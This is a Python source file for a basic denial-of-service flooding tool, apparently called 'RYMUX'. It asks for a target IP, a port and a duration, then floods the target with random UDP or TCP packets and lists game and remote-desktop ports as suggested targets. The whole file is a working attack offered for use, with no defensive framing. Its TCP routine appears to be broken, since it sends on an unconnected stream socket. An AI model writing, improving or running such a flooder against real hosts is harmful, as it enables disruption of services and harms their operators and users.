import socket
import os
import random
import sys
import struct
import threading
from time import time as tt

os.system('cls' if os.name == 'nt' else 'clear')

logo = """
\033[91m██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗
\033[91m██╔══██╗╚██╗░██╔╝████╗░████║██║░░░██║╚██╗██╔╝
\033[91m██████╔╝░╚████╔╝░██╔████╔██║██║░░░██║░╚███╔╝░
\033[91m██╔══██╗░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░██╔██╗░
\033[91m██║░░██║░░░██║░░░██║░╚═╝░██║╚██████╔╝██╔╝╚██
\033[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝
"""

banner = """
\033[91m█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
\033[91m█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
\033[91m|-----------------------|
\033[91m|   TCP    | 80  | 3389 |
\033[91m|   UDP    |17091| 7777 |
\033[91m|----------|------------|
"""

method = str(input("Method (TCP, UDP) : "))

def UDP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    data = random._urandom(666)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(data, addr)

def TCP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    data = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(data, addr)

if __name__ == '__main__':
	print(logo)
	print(banner)
	try:
		if method == 'TCP':
			TCP()
		elif method == 'UDP':
			UDP()
		else:
			print("Unknow method: %s" % method)
	except KeyboardInterrupt:
		print("\033[32mAttack stopped.")